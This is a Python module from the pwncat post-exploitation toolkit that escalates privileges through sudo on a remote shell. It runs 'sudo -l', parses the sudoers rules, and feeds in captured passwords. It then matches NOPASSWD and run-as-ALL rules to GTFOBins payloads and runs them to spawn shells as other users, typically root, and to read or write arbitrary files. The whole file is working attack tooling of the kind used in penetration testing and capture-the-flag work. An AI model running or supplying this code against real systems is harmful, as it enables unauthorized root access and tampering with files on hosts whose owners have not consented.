#!/usr/bin/env python3
from typing import Generator, List, BinaryIO
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style
import socket
from io import StringIO, BytesIO
import functools
import time

from pwncat.util import CTRL_C
from pwncat.privesc.base import Method, PrivescError, Technique
from pwncat.file import RemoteBinaryPipe
from pwncat.pysudoers import Sudoers
from pwncat.gtfobins import Capability, Stream, Binary, SudoNotPossible
from pwncat import util


class SudoMethod(Method):

    name = "sudo"
    BINARIES = ["sudo"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SudoMethod, self).__init__(pty)

    def send_password(self, current_user):

        # peak the output
        output = self.pty.peek_output(some=False).lower()

        if (
            b"[sudo]" in output
            or b"password for " in output
            or output.endswith(b"password: ")
        ):
            if current_user["password"] is None:
                self.pty.client.send(CTRL_C)  # break out of password prompt
                raise PrivescError(
                    f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} has no known password"
                )
        else:
            return  # it did not ask for a password, continue as usual

        # Flush any waiting output
        self.pty.flush_output()

        # Reset the timeout to allow for sudo to pause
        old_timeout = self.pty.client.gettimeout()
        self.pty.client.settimeout(5)
        self.pty.client.send(current_user["password"].encode("utf-8") + b"\n")

        output = self.pty.peek_output(some=True)

        # Reset the timeout to the originl value
        self.pty.client.settimeout(old_timeout)

        if (
            b"[sudo]" in output
            or b"password for " in output
            or b"sorry, " in output
            or b"sudo: " in output
        ):
            self.pty.client.send(CTRL_C)  # break out of password prompt

            # Flush all the output
            self.pty.recvuntil(b"\n")
            raise PrivescError(
                f"user {Fore.GREEN}{current_user['name']}{Fore.RESET} could not sudo"
            )

        return

    def find_sudo(self):

        current_user = self.pty.current_user

        # Process the prompt but it will not wait for the end of the output
        # delim = self.pty.process("sudo -l", delim=True)
        sdelim, edelim = [
            x.encode("utf-8")
            for x in self.pty.process("sudo -p 'Password: ' -l", delim=True)
        ]

        self.send_password(current_user)

        # Get the sudo -l output
        output = self.pty.recvuntil(edelim).split(edelim)[0].strip()
        sudo_output_lines = output.split(b"\n")

        # Determine the starting line of the valuable sudo input
        sudo_output_index = -1
        for index, line in enumerate(sudo_output_lines):

            if line.lower().startswith(b"user "):
                sudo_output_index = index + 1
            if sudo_output_lines != -1:
                sudo_output_lines[index] = line.replace(b" : ", b":")

        sudo_values = "\n".join(
            [
                f"{current_user['name']} ALL={l.decode('utf-8').strip()}"
                for l in sudo_output_lines[sudo_output_index:]
            ]
        )

        sudoers = Sudoers(filp=StringIO(sudo_values))

        return sudoers.rules

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        sudo_rules = self.find_sudo()

        current_user = self.pty.current_user

        if not sudo_rules:
            return []

        sudo_no_password = []
        sudo_all_users = []
        sudo_other_commands = []

        for rule in sudo_rules:
            for commands in rule["commands"]:

                if commands["tags"] is None:
                    command_split = commands["command"].split()
                    run_as_user = command_split[0]
                    tag = ""
                    command = " ".join(command_split[1:])
                if type(commands["tags"]) is list:
                    tags_split = " ".join(commands["tags"]).split()
                    if len(tags_split) == 1:
                        command_split = commands["command"].split()
                        run_as_user = command_split[0]
                        tag = " ".join(tags_split)
                        command = " ".join(command_split[1:])
                    else:
                        run_as_user = tags_split[0]
                        tag = " ".join(tags_split[1:])
                        command = commands["command"]

                if "NOPASSWD" in tag:
                    sudo_no_password.append(
                        {
                            "run_as_user": run_as_user,
                            "command": command,
                            "password": False,
                        }
                    )

                if "ALL" in run_as_user:
                    sudo_all_users.append(
                        {"run_as_user": "root", "command": command, "password": True}
                    )

                else:
                    sudo_other_commands.append(
                        {
                            "run_as_user": run_as_user,
                            "command": command,
                            "password": True,
                        }
                    )

        current_user = self.pty.current_user

        techniques = []
        for sudo_privesc in [*sudo_no_password, *sudo_all_users, *sudo_other_commands]:
            if current_user["password"] is None and sudo_privesc["password"]:
                continue

            # Split the users on a comma
            users = sudo_privesc["run_as_user"].split(",")

            # We don't need to go anywhere else...
            if "ALL" in users:
                users = ["root"]

            for method in self.pty.gtfo.iter_sudo(
                sudo_privesc["command"], caps=capability
            ):
                for user in users:
                    techniques.append(
                        Technique(
                            user,
                            self,
                            (method, sudo_privesc["command"], sudo_privesc["password"]),
                            method.cap,
                        )
                    )

        self.pty.flush_output()

        return techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        current_user = self.pty.current_user

        # Extract the GTFObins method
        method, sudo_spec, need_password = technique.ident

        # Build the payload, input data, and exit command
        payload, input_data, exit_command = method.build(
            user=technique.user, shell=self.pty.shell, spec=sudo_spec
        )

        # Run the commands
        # self.pty.process(payload, delim=True)
        self.pty.run(payload, wait=False)

        # This will check if the password is needed, and attempt to send it or
        # fail, and return
        self.send_password(current_user)

        # Provide stdin if needed
        self.pty.client.send(input_data.encode("utf-8"))

        return exit_command

    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:

        method, sudo_spec, need_password = technique.ident

        # Read the payload
        payload, input_data, exit_command = method.build(
            lfile=filepath, spec=sudo_spec, user=technique.user
        )

        mode = "r"
        if method.stream is Stream.RAW:
            mode += "b"

        # Send the command and open a pipe
        pipe = self.pty.subprocess(
            payload,
            mode,
            data=functools.partial(self.send_password, self.pty.current_user),
            exit_cmd=exit_command.encode("utf-8"),
        )

        # Send the input data required to initiate the transfer
        if len(input_data) > 0:
            self.pty.client.send(input_data.encode("utf-8"))

        return method.wrap_stream(pipe)

    def write_file(self, filepath: str, data: bytes, technique: Technique):

        method, sudo_spec, need_password = technique.ident

        # Build the payload
        payload, input_data, exit_command = method.build(
            lfile=filepath, spec=sudo_spec, user=technique.user, length=len(data)
        )

        mode = "w"
        if method.stream is Stream.RAW:
            mode += "b"

        # Send the command and open a pipe
        pipe = self.pty.subprocess(
            payload,
            mode,
            data=functools.partial(self.send_password, self.pty.current_user),
            exit_cmd=exit_command.encode("utf-8"),
        )

        with method.wrap_stream(pipe) as pipe:

            # Send the input data required to initiate the transfer
            if len(input_data) > 0:
                pipe.write(input_data.encode("utf-8"))

            pipe.write(data)

    def get_name(self, tech: Technique):
        """ Get the name of the given technique for display """
        return (
            (
                f"{Fore.CYAN}{tech.ident[0].binary_path}{Fore.RESET} "
                f"({Fore.RED}sudo{Fore.RESET}"
            )
            + (
                ""
                if tech.ident[2]
                else f" {Style.BRIGHT+Fore.RED}NOPASSWD{Style.RESET_ALL}"
            )
            + ")"
        )
